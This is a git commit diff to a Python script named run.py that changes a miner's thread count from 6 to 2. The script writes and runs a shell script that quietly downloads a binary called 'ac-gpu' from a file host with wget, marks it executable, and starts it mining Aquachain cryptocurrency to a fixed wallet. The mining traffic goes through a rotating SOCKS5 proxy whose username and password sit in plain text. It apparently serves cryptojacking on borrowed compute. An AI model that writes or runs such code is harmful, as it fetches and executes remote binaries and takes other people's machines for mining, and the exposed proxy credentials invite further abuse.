5202af8984f8f9b720a4a89915007cdb083b10d8
mamangfahri7 <83070235+mamangfahri7@users.noreply.github.com>
2022-02-26 04:41:08 +0000

    Update run.py

--- run.py
+++ run.py
@@ -1,6 +1,6 @@
 import os
 os.system('echo "#!/bin/sh" >> tes')
 os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
-os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0xbaA32F16bAaCA5D687CA155C53F0daAc315f0082/TOTO -t 6 --proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
+os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0xbaA32F16bAaCA5D687CA155C53F0daAc315f0082/TOTO -t 2 --proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
 os.system('sleep 2')
 os.system('sh tes')
